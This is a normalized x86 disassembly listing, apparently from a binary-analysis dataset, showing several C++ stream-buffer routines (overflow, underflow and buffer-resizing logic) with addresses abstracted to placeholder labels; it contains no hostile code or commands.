mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ rw-data ]
mov [ ecx + 0x8 ] eax
mov eax ecx
mov edx [ rw-data ]
mov [ ecx + 0xc ] edx
pop ecx
pop ecx
pop ebp
retn
sub_4b7908
push ebp
mov ebp esp
mov eax [ rw-data ]
add esp 0xfffffff8
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ rw-data ]
mov [ ecx + 0x8 ] eax
mov eax ecx
mov edx [ rw-data ]
mov [ ecx + 0xc ] edx
pop ecx
pop ecx
pop ebp
retn
sub_4b7960
push ebp
mov ebp esp
add esp 0xfffffea0
mov eax rw-data
push ebx
push esi
push edi
lea ebx [ ebp - 0x28 ]
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x50 ] 0xffffffff
mov edx [ ebp - 0x50 ]
cmp edx [ ebp + 0xc ]
sete cl
and ecx 0x1
test cl cl
je r-xdata
mov ecx [ esi + 0x28 ]
cmp [ ecx ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
cmp [ esi + 0x50 ] 0x0
jne r-xdata
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x38 ]
mov edx [ eax ]
cmp edx [ ecx ]
jae r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov eax [ esi + 0x28 ]
mov edx [ eax ]
inc [ eax ]
mov cl [ ebp + 0xc ]
mov [ edx ] cl
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov [ ebp - 0x54 ] 0x8
mov cl [ ebp + 0xc ]
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x55 ] cl
mov [ ebp - 0x3c ] 0xc
push eax
call sub_408628
pop ecx
lea edx [ ebp - 0x70 ]
push edx
lea ecx [ ebx + 0x8 ]
push ecx
call sub_408650
add esp 0x8
mov eax 0xf
mov [ ebx + 0x24 ] eax
mov [ ebp - 0x71 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx [ esi + 0x50 ]
mov [ ebp - 0x64 ] ecx
mov al [ ebp + 0xc ]
mov [ ebp - 0x65 ] al
mov edx [ ebp - 0x64 ]
push edx
movsx ecx [ ebp - 0x65 ]
push ecx
call sub_4c9e9c
add esp 0x8
inc eax
setne al
and eax 0x1
test al al
je r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
or eax 0xffffffff
mov eax [ ebp + 0xc ]
jmp r-xdata
mov edx edi
dec edx
mov edx 0x1
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add edx eax
mov [ ebp - 0x78 ] edx
mov edx [ ebp - 0x78 ]
mov cl [ ebp - 0x71 ]
mov [ edx ] cl
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov edi eax
cmp edi 0x1
ja r-xdata
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp [ ebx + 0x24 ] 0x8
jae r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edx 0x8
jae r-xdata
mov cl 0x1
test cl cl
je r-xdata
mov eax [ ebx + 0x20 ]
push eax
push 0x8
push ebx
call sub_408678
add esp 0xc
inc [ ebp - 0x30 ]
mov [ ebp - 0x3c ] 0x18
mov [ ebp - 0x79 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edi [ ebx + 0x10 ]
mov edi [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x128 ] edi
mov eax [ ebp - 0x128 ]
add eax [ ebx + 0x20 ]
mov [ ebp - 0x8c ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x80 ] eax
push 0x8
movsx edx [ ebp - 0x79 ]
push edx
mov ecx [ ebp - 0x80 ]
push ecx
call sub_4c4d44
add esp 0xc
mov [ ebp - 0x81 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
dec eax
je r-xdata
mov [ ebp - 0x90 ] edx
lea edx [ ebp - 0x60 ]
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x138 ] eax
lea eax [ esi + 0x48 ]
mov ecx [ ebp - 0x138 ]
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x98 ] eax
push edx
lea edx [ ebp - 0x5c ]
mov ecx [ ebp - 0x8c ]
push ecx
lea ecx [ ebp - 0x54 ]
mov eax [ ebp - 0x94 ]
push eax
push edx
push ecx
lea eax [ ebp - 0x55 ]
push eax
mov edx [ ebp - 0x98 ]
push edx
mov ecx [ esi + 0x40 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x14 ]
add esp 0x20
sub eax 0x2
jb r-xdata
mov edx 0x8
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x88 ]
mov cl [ ebp - 0x81 ]
mov [ eax ] cl
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov edi [ esi + 0x50 ]
mov cl [ ebp - 0x55 ]
mov [ ebp - 0x105 ] cl
push edi
movsx eax [ ebp - 0x105 ]
push eax
call sub_4c9e9c
add esp 0x8
inc eax
setne dl
and edx 0x1
test dl dl
je r-xdata
jmp r-xdata
mov [ esi + 0x45 ] 0x1
lea ecx [ ebp - 0x55 ]
cmp ecx [ ebp - 0x5c ]
je r-xdata
mov eax [ esi + 0x50 ]
push eax
push edi
push 0x1
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx eax
mov [ ebp - 0x148 ] edx
mov edi [ ebp - 0x60 ]
sub edi edx
mov [ ebp - 0x3c ] 0x18
test edi edi
jbe r-xdata
or eax 0xffffffff
mov eax [ ebp + 0xc ]
jmp r-xdata
or eax 0xffffffff
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
test edi edi
ja r-xdata
mov eax [ ebp + 0xc ]
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x111 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x10c ] edx
mov ecx [ ebp - 0x10c ]
mov [ ebp - 0x110 ] ecx
mov eax [ ebp - 0x110 ]
push eax
call sub_4b0180
pop ecx
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x119 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x20 ] 0x20
jae r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xb5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0xb0 ] edx
mov ecx [ ebp - 0xb0 ]
mov [ ebp - 0xb4 ] ecx
mov eax [ ebp - 0xb4 ]
push eax
call sub_4b0180
pop ecx
or eax 0xffffffff
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebp - 0x9c ] edx
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x158 ] eax
mov ecx [ ebp - 0x158 ]
push ecx
call sub_4c6cac
add esp 0x10
cmp edi eax
je r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
or eax 0xffffffff
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
or ecx 0xffffffff
sub ecx [ ebx + 0x20 ]
cmp ecx 0x8
ja r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xa5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0xa0 ] edx
mov ecx [ ebp - 0xa0 ]
mov [ ebp - 0xa4 ] ecx
mov eax [ ebp - 0xa4 ]
push eax
call sub_4b0180
pop ecx
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x118 ] ecx
mov edx [ ebp - 0x118 ]
mov cl [ ebp - 0x111 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x120 ] ecx
mov edx [ ebp - 0x120 ]
mov cl [ ebp - 0x119 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xfd ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
mov eax [ ebx + 0x20 ]
lea edx [ ebx + 0x8 ]
add eax 0x8
mov [ ebp - 0xc0 ] eax
push edx
mov edi eax
call sub_408880
pop ecx
mov [ ebp - 0xc4 ] eax
cmp [ ebp - 0xc4 ] 0x1
ja r-xdata
push ebx
call sub_4bbca8
pop ecx
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xbc ] ecx
mov edx [ ebp - 0xbc ]
mov cl [ ebp - 0xb5 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xc4 ]
dec ecx
mov ecx 0x1
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xac ] ecx
mov edx [ ebp - 0xac ]
mov cl [ ebp - 0xa5 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x104 ] ecx
mov edx [ ebp - 0x104 ]
mov cl [ ebp - 0xfd ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp edi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edi ecx
jbe r-xdata
test edi edi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push edi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xdd ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebp - 0xe5 ] 0x0
mov edx [ ebx + 0x20 ]
mov [ ebp - 0xec ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xe4 ] eax
mov eax [ ebp - 0xe4 ]
mov cl [ ebp - 0xdd ]
mov [ eax ] cl
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0xec ]
mov [ ebp - 0xf0 ] ecx
push 0x8
movsx eax [ ebp - 0xe5 ]
push eax
mov edx [ ebp - 0xf0 ]
push edx
call sub_4c4d44
add esp 0xc
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0xf4 ] eax
mov [ ebp - 0xf5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0xf4 ]
mov [ ebx + 0x20 ] eax
add edx eax
mov [ ebp - 0xfc ] edx
mov edx [ ebp - 0xfc ]
mov cl [ ebp - 0xf5 ]
mov [ edx ] cl
jmp r-xdata
sub_4b80ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ ebx + 0x50 ] 0x0
je r-xdata
mov edx [ ebx + 0x14 ]
cmp eax [ edx ]
jbe r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax 0xffffffff
cmp esi eax
sete dl
and edx 0x1
test dl dl
je r-xdata
mov eax 0xffffffff
cmp esi eax
sete cl
and ecx 0x1
test cl cl
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x24 ]
dec [ ecx ]
cmp esi 0xffffffff
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax ]
xor eax eax
mov al [ edx - 0x1 ]
cmp esi eax
sete dl
and edx 0x1
test dl dl
je r-xdata
or eax 0xffffffff
mov edi [ ebx + 0x50 ]
mov edx esi
mov [ ebp - 0x1 ] dl
push edi
xor ecx ecx
mov cl [ ebp - 0x1 ]
push ecx
call sub_4c8874
add esp 0x8
inc eax
setne al
and eax 0x1
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
jmp r-xdata
mov eax esi
jmp r-xdata
sub_4b8198
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x1c ]
mov esi eax
mov edi 0xffffffff
cmp esi edi
pop ecx
sete dl
and edx 0x1
test dl dl
je r-xdata
mov edx [ ebx + 0x34 ]
cmp eax [ edx ]
jae r-xdata
push esi
push ebx
mov edx [ ebx ]
call [ edx + 0x10 ]
add esp 0x8
mov eax esi
mov eax esi
jmp r-xdata
xor ecx ecx
mov cl [ eax ]
mov eax ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4b81e8
push ebp
mov ebp esp
add esp 0xfffffe90
mov eax rw-data
push ebx
push esi
push edi
lea ebx [ ebp - 0x28 ]
mov edi [ ebp + 0x8 ]
call sub_4c517c
mov edx [ edi + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
cmp [ edi + 0x50 ] 0x0
jne r-xdata
mov ecx [ edi + 0x24 ]
mov edx [ edi + 0x34 ]
mov eax [ ecx ]
cmp eax [ edx ]
jae r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ecx [ edi + 0x24 ]
mov eax [ ecx ]
inc [ ecx ]
mov [ ebp - 0x5c ] eax
mov edx [ ebp - 0x5c ]
xor eax eax
mov al [ edx ]
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov [ ebp - 0x3c ] 0xc
lea ecx [ ebp - 0x64 ]
push ecx
call sub_408628
pop ecx
lea eax [ ebp - 0x64 ]
push eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408650
add esp 0x8
mov ecx 0xf
mov [ ebx + 0x24 ] ecx
mov [ ebp - 0x65 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx [ edi + 0x50 ]
mov [ ebp - 0x54 ] ecx
mov eax [ ebp - 0x54 ]
push eax
call sub_4c9e4c
pop ecx
mov [ ebp - 0x58 ] eax
inc eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov cl [ ebp - 0x58 ]
mov dl 0x1
mov [ ebp - 0x4d ] cl
xor edx edx
jmp r-xdata
mov [ ebp - 0x81 ] al
or ecx 0xffffffff
sub ecx [ ebx + 0x20 ]
cmp ecx 0x1
ja r-xdata
or eax 0xffffffff
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x6c ]
mov cl [ ebp - 0x65 ]
mov [ eax ] cl
inc [ ebp - 0x30 ]
mov [ ebp - 0x3c ] 0x18
or eax 0xffffffff
xor eax eax
mov al [ ebp - 0x4d ]
jmp r-xdata
test dl dl
je r-xdata
mov eax [ ebx + 0x20 ]
lea edx [ ebx + 0x8 ]
inc eax
mov [ ebp - 0x88 ] eax
push edx
mov esi eax
call sub_408880
pop ecx
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x1
ja r-xdata
push ebx
call sub_4bbca8
pop ecx
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x79 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ecx [ ebp - 0x8c ]
dec ecx
mov ecx 0x1
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
cmp esi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp esi ecx
jbe r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x80 ] ecx
mov edx [ ebp - 0x80 ]
mov cl [ ebp - 0x79 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push esi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
test esi esi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xa5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
mov eax [ ebx + 0x20 ]
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea esi [ ebx + 0x10 ]
mov esi [ ebx + 0x10 ]
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xac ] eax
mov eax [ ebp - 0xac ]
mov cl [ ebp - 0xa5 ]
mov [ eax ] cl
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x128 ] esi
mov eax [ ebp - 0x128 ]
add eax [ ebx + 0x20 ]
mov [ ebp - 0xbc ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx eax
mov al [ ebp - 0x81 ]
mov [ edx ] al
mov ecx [ ebp - 0x88 ]
mov [ ebp - 0xb0 ] ecx
mov [ ebp - 0xb1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebp - 0x6d ]
cmp edx [ ebp - 0x74 ]
je r-xdata
dec eax
je r-xdata
mov [ ebp - 0xc0 ] edx
lea edx [ ebp - 0x74 ]
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0x138 ] eax
lea eax [ edi + 0x48 ]
mov ecx [ ebp - 0x138 ]
mov [ ebp - 0xc4 ] ecx
mov [ ebp - 0xc8 ] eax
push edx
lea ecx [ ebp - 0x6c ]
push ecx
lea eax [ ebp - 0x6d ]
push eax
lea edx [ ebp - 0x78 ]
push edx
mov ecx [ ebp - 0xbc ]
push ecx
mov eax [ ebp - 0xc4 ]
push eax
mov edx [ ebp - 0xc8 ]
push edx
mov ecx [ edi + 0x40 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x10 ]
add esp 0x20
sub eax 0x2
jb r-xdata
mov edx [ ebp - 0xb0 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xb8 ] eax
mov eax [ ebp - 0xb8 ]
mov cl [ ebp - 0xb1 ]
mov [ eax ] cl
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x20 ] 0x1
jb r-xdata
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x50 ]
push eax
call sub_4c9e4c
pop ecx
mov [ ebp - 0x3c ] 0x18
cmp eax 0xffffffff
jne r-xdata
push 0x1
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
or eax 0xffffffff
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp esi [ ebx + 0x20 ]
jbe r-xdata
push ebx
call sub_4bc8cc
pop ecx
mov [ ebp - 0xe0 ] ecx
mov eax [ ebp - 0xe0 ]
mov [ ebp - 0x158 ] eax
mov edx [ ebp - 0x158 ]
mov esi [ ebp - 0x78 ]
sub esi edx
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
xor eax eax
mov al [ ebp - 0x6d ]
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ edi + 0x50 ]
push eax
dec esi
mov edx [ ebp - 0x78 ]
movsx ecx [ edx + esi ]
push ecx
call sub_4c8874
add esp 0x8
test esi esi
jg r-xdata
mov [ ebp - 0xcc ] ecx
mov eax [ ebp - 0xcc ]
mov [ ebp - 0x148 ] eax
mov esi [ ebp - 0x148 ]
add esi [ ebx + 0x20 ]
sub esi [ ebp - 0x78 ]
test esi esi
jle r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x119 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x114 ] edx
mov ecx [ ebp - 0x114 ]
mov [ ebp - 0x118 ] ecx
mov eax [ ebp - 0x118 ]
push eax
call sub_4b0180
pop ecx
test esi esi
jbe r-xdata
mov esi [ ebx + 0x20 ]
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xd5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0xd0 ] edx
mov ecx [ ebp - 0xd0 ]
mov [ ebp - 0xd4 ] ecx
mov eax [ ebp - 0xd4 ]
push eax
call sub_4b0180
pop ecx
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x109 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x104 ] edx
mov ecx [ ebp - 0x104 ]
mov [ ebp - 0x108 ] ecx
mov eax [ ebp - 0x108 ]
push eax
call sub_4b0180
pop ecx
mov [ ebp - 0x100 ] eax
mov edx [ ebp - 0x100 ]
mov [ ebp - 0x168 ] edx
mov ecx [ ebp - 0x168 ]
push ecx
lea eax [ ebp - 0x6d ]
push eax
call sub_4c4cb0
add esp 0xc
xor eax eax
mov al [ ebp - 0x6d ]
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x20 ]
sub eax esi
mov [ ebp - 0xe4 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x120 ] ecx
mov edx [ ebp - 0x120 ]
mov cl [ ebp - 0x119 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xdc ] ecx
mov edx [ ebp - 0xdc ]
mov cl [ ebp - 0xd5 ]
mov [ edx ] cl
mov [ ebp - 0x3c ] 0x18
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x110 ] ecx
mov edx [ ebp - 0x110 ]
mov cl [ ebp - 0x109 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx esi
mov [ ebp - 0xe8 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xec ] eax
mov edx [ ebp - 0xe4 ]
push edx
mov ecx [ ebp - 0xe8 ]
push ecx
mov eax [ ebp - 0xec ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx esi
mov [ ebp - 0xf0 ] edx
mov ecx [ ebp - 0xf0 ]
mov [ ebp - 0xf4 ] ecx
mov [ ebp - 0xf5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0xf4 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xfc ] eax
mov eax [ ebp - 0xfc ]
mov cl [ ebp - 0xf5 ]
mov [ eax ] cl
jmp r-xdata
sub_4b88b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov eax [ ebx + 0x24 ]
mov edx [ eax ]
lea ecx [ ebx + 0x44 ]
cmp edx ecx
jne r-xdata
cmp [ ebx + 0x50 ] 0x0
je r-xdata
cmp edi 0x1
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x10 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x10 ]
mov [ esi ] ecx
mov ecx [ ebp - 0xc ]
mov [ esi + 0x4 ] ecx
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov eax esi
mov edx [ rw-data ]
mov [ esi + 0xc ] edx
jmp r-xdata
push ebx
call sub_4b6afc
pop ecx
test al al
je r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
sub [ ebp + 0x10 ] 0x1
sbb [ ebp + 0x14 ] 0x0
push edi
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebx + 0x50 ]
push edx
call sub_4c6b8c
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
mov eax [ ebx + 0x50 ]
push eax
call sub_4c69a0
add esp 0x8
test eax eax
je r-xdata
cmp edi 0x1
je r-xdata
lea edx [ ebx + 0x44 ]
mov ecx [ ebx + 0x24 ]
cmp edx [ ecx ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ ebx + 0x48 ]
mov [ esi ] 0x0
mov eax esi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edi
lea ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x45 ]
mov [ ebp - 0x8 ] ecx
mov eax edx
mov ecx [ ebx + 0x14 ]
mov edi [ ebp - 0x8 ]
mov [ ecx ] edi
mov ecx [ ebx + 0x24 ]
mov [ ecx ] edx
mov edx [ ebx + 0x34 ]
